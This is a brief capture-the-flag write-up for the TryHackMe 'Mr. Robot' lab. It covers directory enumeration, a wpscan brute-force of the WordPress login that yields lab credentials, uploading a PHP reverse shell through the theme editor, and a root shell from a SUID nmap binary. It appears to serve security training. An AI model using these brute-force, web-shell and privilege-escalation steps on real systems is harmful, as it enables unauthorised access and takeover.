# THM: Mr. Robot — Writeup

**Difficulty:** Medium | **OS:** Linux

## Enumeration
```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# → /robots.txt (key-1-of-3.txt, fsocity.dic wordlist)
# → /wp-login.php
```

## Exploitation
```bash
# Brute-force WordPress
wpscan --url http://TARGET -U elliot -P fsocity.dic
# Found: elliot / ER28-0652

# Upload PHP reverse shell via Appearance → Theme Editor → 404.php
```

## Privilege Escalation
```bash
find / -perm -u=s -type f 2>/dev/null
# /usr/local/bin/nmap (SUID)

nmap --interactive
nmap> !sh
# → root
```
